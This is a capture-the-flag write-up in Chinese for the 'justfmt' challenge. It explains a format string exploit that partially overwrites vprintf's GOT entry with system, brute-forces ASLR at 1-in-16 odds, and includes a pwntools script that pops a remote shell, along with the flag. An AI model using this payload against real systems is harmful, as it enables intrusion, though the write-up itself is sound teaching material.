## justfmt
### solution
`WriteFormatted`會把參數丟到`va_list`傳給`vprintf`，因此實際上就等於`printf`，題目大致能改寫如下
```c
int main() {
    read(0, buf, 40)
    printf(buf);
    printf(buf);
}
```
本題`printf`有40 bytes buffer的format string漏洞，基本上能辦到任意寫跟leak，詭異的點在於連續`printf`兩次，但中間卻沒有任何輸入能改變buf。

題目給了libc，但只有一次input，就算leak出位址了也不能再次輸入，沒有leak的話也沒辦法知道return的位址來控制rip，

檔案只有PARTIAL RELRO，唯一想到控制rip的方法是overwrite `vprintf@got`，原本想試圖寫為`main`之類的，但若是寫掉`vprintf`也就無法再繼續使用漏洞，試著partial寫成one gadget也都fail。

最後想到的是不穩定的方式，在提供的libc中可以發現`vprintf`位址為`0x4f040`，`system`為`0x46590`，由於ASLR不會隨機化最後12bits，且這兩者在附近，因此我們可以試著把`vprintf@got`最後2 bytes(16bits)寫成`0x6590`，如此一來只要賭前4個bit(16種可能)，也就是1/16的機率相同即可執行`system`。

再來是payload，由於要執行shell，因此最前面加上`sh #`來截斷後面的部份即可。

### script
```python
#!/usr/bin/env python3
from pwn import *
context(arch="amd64")

while True :
    r = remote("104.199.235.135", 2113)
    binary = ELF("justfmt")
    libc = ELF("libc-2.19.so")

    payload = b"sh #"
    payload += b"%%%dc%%13$hn" % (libc.symbols[b"system"] % 0x10000 - len(payload))
    payload += b"a" * (0x38 - len(payload))
    payload += p64(binary.got[b'vprintf'])

    r.sendline(payload)
    try:
        r.interactive()
    except:
        r.close()
        continue
```
### flag
```
AIS3{fMt_stR1n6_1s_H4rp_s0w3t1meS_dnt_1ts_fnu!!}
```
